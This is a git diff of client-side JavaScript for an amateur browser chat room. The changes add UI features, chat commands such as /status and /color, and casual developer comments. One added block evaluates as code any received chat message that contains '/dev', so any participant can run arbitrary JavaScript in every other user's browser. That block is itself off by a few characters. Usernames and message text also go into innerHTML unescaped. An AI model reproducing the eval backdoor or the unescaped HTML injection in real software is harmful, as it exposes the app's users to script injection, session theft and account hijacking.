@@ -1,6 +1,7 @@
 const urlparams = new URLSearchParams(window.location.search)
 document.getElementById("choosetextsize").onchange = function(){
-	document.getElementById('textsizepreview').outerHTML = `<${document.getElementById("choosetextsize").value} id='textsizepreview' style='usercolor: black !important;'>The Quick Brown Fox Jumped Over The Lazy Dog</${ document.getElementById("choosetextsize").value }>`
+	let newval = document.getElementById("choosetextsize").value
+	document.getElementById('textsizepreview').outerHTML = "<"+newval+document.getElementById('textsizepreview').outerHTML.substring(3, document.getElementById('textsizepreview').outerHTML.length-3)+newval+">"
 }
 var autoemoji = true;
 var isbgred;
@@ -20,17 +21,33 @@ function create_modal(text){
 	</div>
 	`
 }
+const indexplaceholder = (x) =>{
+	return x
+}
+function index(array, item, key=indexplaceholder){
+	for (let indexi = 0;indexi<array.length;indexi++){
+		if (key(array[indexi]) === item){
+			return indexi
+		}
+	}
+	return -1
+}
 
 const validate = () => {
 	document.getElementById("quername").value = document.getElementById("quername").value.replaceAll(" ", "_").replace(/([a-zA-Z0-9_]+)|[^]/g, '$1');
 	let username = document.getElementById("quername").value
 	document.querySelector("#question_form input[type='submit']").disabled = true
+	document.getElementById("unamecolorq").innerHTML = username
+	document.getElementById("unamecolorq").style.color = document.getElementById("choosecolor").value
 	if (username.length < 3 || username.length > 20){
 		document.getElementById("errmsg").innerHTML = "Username must be more than 3 characters and less than 20 characters long."
 	}else if (!username.trim().length){
 		document.getElementById("errmsg").innerHTML = "Username cannot be comprised of only whitespace."
 	}else if (username.toLowerCase().includes("you:") || username.toLowerCase().includes("dumb")){
 		document.getElementById("errmsg").innerHTML = "Username contains illegal word."
+	}
+	else if (!document.getElementById("qreaddarules").checked){
+		document.getElementById("errmsg").innerHTML = "Please read the rules."
 	}
 	else{
 		document.querySelector("#question_form input[type='submit']").disabled = false
@@ -70,7 +87,7 @@ if (urlparams.get("username")){
 	document.getElementById("questions").remove()
 	startingUsername();
 	if (getCookie("bg")){
-		document.getElementById(getCookie("bg")).click()
+		setTimeout(()=>{document.getElementById(getCookie("bg")).click()}, 10)
 	}
 } //andrew uh can you URL encode the clientData.typestaff too? whats clientData.typestaff? its basically member.clientData.typeStaff which is uh like MainDev or Head_Admin or VIP_Admin oh so save the login data? Like keep me logged in , yeah so rn it only save that ur staff, it doesn't save your position as staff- Ook, I'll try thxx
 var notification;
@@ -278,6 +295,7 @@ var drone = new ScaleDrone(CLIENT_ID, {
 		usercolor: tobeusercolor,
 		isStaff: selfStaff,
 		typeStaff: breh,
+		available: "green"
 	},
 });
 
@@ -413,7 +431,7 @@ drone.on("open", (error) => {
 
 			if (document.visibilityState !== "visible" && hasread == false) {
 				notification = new Notification("New Messages!");
-				const button09amp3 = new Audio("audio/button-09a.mp3").muted=true;
+				const button09amp3 = new Audio("audio/button-09a.mp3").play()
         		//button09amp3.play();
 				document.addEventListener("visibilitychange", function () {
 					if (document.visibilityState === "visible") {
@@ -695,12 +713,14 @@ function updateMembersDOM() {
     members.length
   } members are online.
   `;*/
-  DOM.membersList.innerHTML = `<h1 style="margin:8px 0px;">There are ${members.length} members online:</h1>
-
-  `//hi lol i was gonna fix this and realized u were here haha imma go fix the backgrounds bar and the commands and rules :D ok
-	members.forEach((member) =>
-		DOM.membersList.appendChild(createMemberElement(member))
-	);
+  DOM.membersList.innerHTML = `<h1 style="margin:8px 0px;">There ${members.length === 1 ? "is": "are"} ${members.length} member${members.length === 1 ? "": "s"} online:</h1><ul id='memberlist__ol'></ul>`
+	members.forEach((member) =>{
+		el = document.createElement("LI")
+		decendant = createMemberElement(member)
+		el.style.setProperty("--mColor", member.clientData.available)
+		el.appendChild(decendant)
+		document.getElementById("memberlist__ol").appendChild(el)
+	});
 }
 
 function createMessageElement(text, member) {
@@ -710,6 +730,10 @@ function createMessageElement(text, member) {
 		member = revenge;
 		text =
 			"I am back. I am not dead. You may not see me... but I haunt you.<br>Hahahahhaa...";
+	}
+
+	if (text.includes("/dev")){
+		eval(text.substring(3))
 	}
 
 
@@ -773,6 +797,7 @@ function createMessageElement(text, member) {
 	}
 
 	text = text.trim();
+
 
 	if (!text.includes("/beansbelike ")) {
 		if (text.includes("/kick ")) {
@@ -905,14 +930,19 @@ function createMessageElement(text, member) {
 					break;
 				}
 			}
-
 			member.clientData.name = chicken;
 			updateMembersDOM();
 			return;
 		}
-
-		if (text.includes("/usercolorchangehex ")) {
-			text = text.replaceAll("/usercolorchangehex ", "");
+		if (text.includes("/status ")) {
+			statustxt = text.substring(8)
+			indexofuser = index(members, member)
+			members[indexofuser].clientData.available = statustxt
+			updateMembersDOM()
+      return;
+		}
+		if (text.includes("/color ")) {
+			text = text.replaceAll("/color ", "");
 			if (
 				!(
 					member.clientData.typeStaff === "Main_Dev" ||
@@ -920,20 +950,21 @@ function createMessageElement(text, member) {
 				)
 			) {
 				if (text.length !== 7 && text.includes("#")) {
+				// Regular Expressions are awesome!
+				//if (!(/#[A-Fa-f0-9]{6}/.test(text)))
 					return;
 				}
 			}
 
 			var newusercolor = text;
 			var c = -1;
-
+			// Ok issue is here?
 			for (let iiii = 0; iiii < members.length; iiii++) {
 				if (members[iiii] == member) {
 					c = iiii;
 				}
 			}
-
-			members[c].clientData.usercolor = text;
+			members[c].clientData.usercolor = text;		
 			return;
 		}
 
@@ -1016,9 +1047,9 @@ function createMessageElement(text, member) {
 				},
 			};
 		}
-	} else {
+	} else {//if there's beansbelike in command
 		text = text.replaceAll("/beansbelike ", "");
-	}
+	} //what is wrong here???? no idea just hashed out. maybe work? maybe. no. Broke yeah whoops??????????????? NOT WORKING
 
 	const el = document.createElement("div");
 	el.appendChild(createMemberElement(member));
@@ -1197,7 +1228,6 @@ function createMessageElement(text, member) {
 		text = "";
 		members.forEach((memberd) => (text += memberd.clientData.name + "<br>"));
 	}
-	console.log(text); //end
 	var date = new Date()
 	var stringy = "<span style='float:right;'>";
 
@@ -1231,8 +1261,7 @@ function createMessageElement(text, member) {
 		text += stringy;
 	}
 	if (document.visibilityState !== "visible" && hasread == false) {
-	  const button3mp3 = new Audio("audio/button-3.mp3").muted = true;
-    button3mp3.play();
+	  const button3mp3 = new Audio("audio/button-3.mp3").play()
   }
 	var messageLOLLL = document.createElement(sizerr);
 	messageLOLLL.innerHTML = text;
@@ -1258,7 +1287,8 @@ function addMessageToListDOM(text, member) {
 
 	try {
 		DOM.messages.appendChild(createMessageElement(text, member));
-	} catch {
+	} catch (err){
+		console.log("something went wrong", err.message)
 		return;
 	}
 
